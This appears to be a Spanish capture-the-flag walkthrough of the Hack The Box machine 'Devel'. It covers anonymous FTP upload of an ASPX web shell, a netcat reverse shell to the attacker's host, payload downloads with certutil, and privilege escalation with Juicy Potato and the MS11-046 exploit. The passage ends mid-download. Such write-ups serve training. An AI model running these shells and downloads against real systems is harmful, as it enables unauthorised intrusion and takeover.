-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;11.54 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A partir de los resultados obtenidos de nmap, observamos que se encuentra abierto el puerto 21 asociado al servicio FTP; por lo que trataremos de establece una conexión con el usuario &lt;em&gt;anonymous&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.5
-Connected to 10.10.10.5.
-220 Microsoft FTP Service
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.5:kamiyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
-331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
-Password:
-230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-03-18-17  02:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
-03-17-17  05:37PM                  689 iisstart.htm
-03-17-17  05:37PM               184946 welcome.png
-226 Transfer complete.
-ftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De los recursos observados en el servidor FTP, se observan que podrían estár relacionados con el sitio web que hace uso de Microsoft IIS 7.5, por lo que es posible que podamos subir archivo y visualizarlos por la web. Hacemos un archivo de prueba para validar.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ catn test.htm
-&amp;lt;html&amp;gt;
-&amp;lt;body&amp;gt;
-	&amp;lt;pre&amp;gt;Test&amp;lt;/pre&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; put test.htm
-&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: test.htm remote: test.htm
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-226 Transfer complete.
-51 bytes sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0573 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-03-18-17  02:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
-03-17-17  05:37PM                  689 iisstart.htm
-08-29-21  12:32AM                   51 test.htm
-03-17-17  05:37PM               184946 welcome.png
-226 Transfer complete.
-ftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Accediendo al recurso http://10.10.10.5/test.htm observamos nuestro código subido, por lo que los archivos que subamos por FTP se encuentran asociados al sitio web. Ahora, sabiendo que IIS maneja archivos de extensión &lt;strong&gt;aspx&lt;/strong&gt;, podemos crear un archivo con dicha extensión que nos entable una reverse shell hacia nuestro equipo de atacante. Se podría pensar en generar un archivo PHP; sin embargo, con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; o el plugin &lt;em&gt;wappalyzer&lt;/em&gt; no observamos que el servidor nos pueda interpretar código php.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devel/devel-test.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Primero, buscamos archivo en nuestro sistema que nos puedan ayudar:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ locate webshell | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;asp
-/usr/share/webshells/asp
-/usr/share/webshells/asp/cmd-asp-5.1.asp
-/usr/share/webshells/asp/cmdasp.asp
-/usr/share/webshells/aspx
-/usr/share/webshells/aspx/cmdasp.aspx
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para este caso utilizaremos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdasp.aspx&lt;/code&gt;, por lo que lo subimos al servidor:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; put cmdasp.aspx
-&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: cmdasp.aspx remote: cmdasp.aspx
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-226 Transfer complete.
-1442 bytes sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;35.2615 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-03-18-17  02:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
-08-29-21  12:56AM                 1442 cmdasp.aspx
-03-17-17  05:37PM                  689 iisstart.htm
-08-29-21  12:32AM                   51 test.htm
-03-17-17  05:37PM               184946 welcome.png
-226 Transfer complete.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Abrimos el recurso desde el navegador y observamos nuestra webshell, para validar introducimos los comandos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipconfig&lt;/code&gt; para corroborar que nos encontramos en la máquina víctima y tenermos ejecución de comandos a nivel de sistema.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devel/devel-cmdasp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devel/devel-cmdasp1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora procedemos a entablarnos una reverse shell, primerament subimos el archivo &lt;em&gt;nc.exe&lt;/em&gt; para poderlo ejecutar:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; put nc.exe
-&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: nc.exe remote: nc.exe
-200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-226 Transfer complete.
-28306 bytes sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;39.1228 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-03-18-17  02:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
-08-29-21  12:56AM                 1442 cmdasp.aspx
-03-17-17  05:37PM                  689 iisstart.htm
-08-29-21  01:04AM                28306 nc.exe
-08-29-21  12:32AM                   51 test.htm
-03-17-17  05:37PM               184946 welcome.png
-226 Transfer complete.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Después, en nuestra webshell introducimos el siguiente comando para localizar donde se encuentra el archivo &lt;em&gt;nc.exe&lt;/em&gt; dentro del sistema &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd C:\ &amp;amp;&amp;amp; dir /s nc.exe&lt;/code&gt;. Identificamos que el archivo se encuentran en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\inetpub\wwwroot&lt;/code&gt;. Ahora nos ponemos en escucha por el puerto 443 y nos establecemos una conexión introduciendo el siguiente comando en la webshell &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.15 443&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devel/devel-cmdasp2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.15] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.5] 49157
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7600]
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
-
-&lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;iis apppool&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb
-
-c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos acceso al sistema. Ahora enumeramos un poco la máquina para observa que privilegios tenemos o de que forma escalamos privilegios.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv
-
-PRIVILEGES INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
-
-Privilege Name                Description                               State   
-&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========&lt;/span&gt;
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a process        Disabled
-SeShutdownPrivilege           Shut down the system                      Disabled
-SeAuditPrivilege              Generate security audits                  Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeUndockPrivilege             Remove computer from docking station      Disabled
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege       Create global objects                     Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set            &lt;/span&gt;Disabled
-SeTimeZonePrivilege           Change the &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;zone                      Disabled
-
-C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&amp;gt;
-systeminfo
-
-Host Name:                 DEVEL
-OS Name:                   Microsoft Windows 7 Enterprise 
-OS Version:                6.1.7600 N/A Build 7600
-OS Manufacturer:           Microsoft Corporation
-OS Configuration:          Standalone Workstation
-OS Build Type:             Multiprocessor Free
-Registered Owner:          babis
-Registered Organization:   
-Product ID:                55041-051-0948536-86302
-Original Install Date:     17/3/2017, 4:17:31 
-System Boot Time:          29/8/2021, 1:15:26 
-System Manufacturer:       VMware, Inc.
-System Model:              VMware Virtual Platform
-System Type:               X86-based PC
-Processor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:              1 Processor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Installed.
-                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
-BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
-Windows Directory:         C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows
-System Directory:          C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32
-Boot Device:               &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume1
-System Locale:             el&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;Greek
-Input Locale:              en-us&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;English &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;United States&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Time Zone:                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UTC+02:00&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Athens, Bucharest, Istanbul
-Total Physical Memory:     3.071 MB
-Available Physical Memory: 2.458 MB
-Virtual Memory: Max Size:  6.141 MB
-Virtual Memory: Available: 5.519 MB
-Virtual Memory: In Use:    622 MB
-Page File Location&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:     C:&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;agefile.sys
-Domain:                    HTB
-Logon Server:              N/A
-Hotfix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:                 N/A
-Network Card&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:           1 NIC&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Installed.
-                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: vmxnet3 Ethernet Adapter
-                                 Connection Name: Local Area Connection 3
-                                 DHCP Enabled:    No
-                                 IP address&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;es&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-                                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: 10.10.10.5
-                                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;02]: fe80::58c0:f1cf:abc6:bb9e
-                                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;03]: dead:beef::45f:18cb:2ab3:a6b2
-                                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;04]: dead:beef::58c0:f1cf:abc6:bb9e
-
-C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Observamos dos vías potenciales para escalar privilegios en el sistema, el usuario presenta habilitado &lt;em&gt;SeImpersonatePrivilege&lt;/em&gt; por lo que con la herramienta &lt;a href=&quot;https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2&quot;&gt;Juicy Potato&lt;/a&gt; podemos escalar privilegios.&lt;/p&gt;
-
-&lt;p&gt;Nos descargamos el archivo, lo subimos al sistema junto con el archivo &lt;strong&gt;nc.exe&lt;/strong&gt; compartiendo un servidor con python y descargandolo en &lt;em&gt;C:\Windows\Temp\Privesc&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
-10.10.10.5 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;28/Aug/2021 17:42:06] &lt;span class=&quot;s2&quot;&gt;&quot;GET /Juicy.Potato.x86.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-10.10.10.5 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;28/Aug/2021 17:42:09] &lt;span class=&quot;s2&quot;&gt;&quot;GET /Juicy.Potato.x86.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-10.10.10.5 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;28/Aug/2021 18:02:44] &lt;span class=&quot;s2&quot;&gt;&quot;GET /nc.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-10.10.10.5 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;28/Aug/2021 18:02:47] &lt;span class=&quot;s2&quot;&gt;&quot;GET /nc.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp                                                                                                                         
-&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;Privesc                                                                     
-&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;Privesc                                                                                                         
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Privesc                              
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Privesc                                                                                 
-certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.15/Juicy.Potato.x86.exe C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\J&lt;/span&gt;P.exe
-&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-  000000  ...
-  040600
-CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
-
-certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.15/nc.exe C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe
-certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.15/nc.exe C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe
-&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-  0000  ...
-  6e00
-CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos el archivo &lt;strong&gt;JP.exe&lt;/strong&gt;  comprobamos que información nos solicita. De acuerdo con el página de &lt;a href=&quot;https://github.com/ivanitlearning/Juicy-Potato-x86&quot;&gt;Github&lt;/a&gt;, nos muestra un ejemplo de uso; por lo que tomamos dichos valores y agregamos el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; para ejecutar nuestro comando; en este caso una reverse shell a nuestro equipo de acatante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a &quot;/c C:\Windows\Temp\Privesc\nc.exe -e cmd.exe 10.10.14.15 443&quot;&lt;/code&gt;, por lo que antes de ejcutar el programa nos ponemos en escucha por el puerto 443&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;JP.exe
-JP.exe
-JuicyPotato v0.1 
-
-Mandatory args: 
-&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; createprocess call: &amp;lt;t&amp;gt; CreateProcessWithTokenW, &amp;lt;u&amp;gt; CreateProcessAsUser, &amp;lt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; try both
-&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &amp;lt;program&amp;gt;: program to launch
-&lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &amp;lt;port&amp;gt;: COM server listen port
-
-
-Optional args: 
-&lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &amp;lt;ip&amp;gt;: COM server listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default 127.0.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &amp;lt;argument&amp;gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;line argument to pass to program &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default NULL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &amp;lt;ip&amp;gt;: RPC server ip address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default 127.0.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &amp;lt;port&amp;gt;: RPC server listen port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default 135&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;clsid&lt;span class=&quot;o&quot;&gt;}&amp;gt;&lt;/span&gt;: CLSID &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default BITS:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;4991d34b-80a1-4291-83b6-3328366b9097&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; only &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;CLSID and print token&lt;span class=&quot;s1&quot;&gt;'s user
-
-C:\Windows\Temp\Privesc&amp;gt;
-JP.exe -l 4444 -p c:\windows\system32\cmd.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} -a &quot;/c C:\Windows\Temp\Privesc\nc.exe -e cmd.exe 10.10.14.15 443&quot;
-Testing {6d18ad12-bde3-4393-b311-099c346e6df9} 4444
-......
-[+] authresult 0
-{6d18ad12-bde3-4393-b311-099c346e6df9};NT AUTHORITY\SYSTEM
-
-[+] CreateProcessWithTokenW OK
-
-C:\Windows\Temp\Privesc&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.15] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.5] 49183
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7600]
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
-
-&lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somos adminstradores del sistema, ahora podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;
-
-&lt;p&gt;Otra forma de escalar privilegios es que vemos que la máquina presenta el sistema operativo &lt;em&gt;Microsoft Windows 7 Enterprise 6.1.7600 N/A Build 7600&lt;/em&gt;, dicha versión de tecnología presenta una vulnerabilidad descrita en el CVE &lt;em&gt;CVE-2011-1249&lt;/em&gt; relacionado al &lt;em&gt;MS11-046&lt;/em&gt;; por lo que podemos buscar un exploit compilado que nos facilite la escalada de privilegios:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos descargamos el archivo, lo subimos al sistema compartiendo un servidor con python y descargandolo en &lt;em&gt;C:\Windows\Temp\Privesc&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
-10.10.10.5 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;28/Aug/2021 17:28:22] &lt;span class=&quot;s2&quot;&gt;&quot;GET /ms11-046.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
